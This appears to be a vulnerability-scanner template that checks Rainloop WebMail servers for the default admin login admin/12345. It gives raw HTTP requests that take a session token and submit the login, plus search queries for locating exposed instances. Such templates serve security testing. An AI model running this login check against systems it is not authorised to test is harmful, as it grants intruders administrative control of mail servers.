id: rainloop-default-login
info:
  name: Rainloop WebMail - Default Admin Login
  author: For3stCo1d
  severity: high
  description: Rainloop WebMail default admin login credentials were successful.
  reference:
    - https://github.com/RainLoop/rainloop-webmail/issues/28
  classification:
    cpe: cpe:2.3:a:rainloop:webmail:*:*:*:*:*:*:*:*
  metadata:
    runzero-match: any(each(service["html.bodies"]), {# matches "rainloop/"})
    fofa-query: app="RAINLOOP-WebMail"
    max-request: 2
    product: webmail
    vendor: rainloop
    verified: true
  tags: default-login,foss,rainloop,vuln,webmail
http:
  - attack: pitchfork
    extractors:
      - group: 1
        internal: true
        name: token
        regex:
          - token":"(.+?)"
        type: regex
    matchers:
      - condition: and
        type: word
        words:
          - '"Action":"AdminLogin"'
          - '"Result":true'
      - status:
          - 200
        type: status
    matchers-condition: and
    payloads:
      pass:
        - 12345
      user:
        - admin
    raw:
      - |
        GET /?/AdminAppData@no-mobile-0/0/15503332983847185/ HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /?/Ajax/&q[]=/0/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        Login={{user}}&Password={{pass}}&Action=AdminLogin&XToken={{token}}
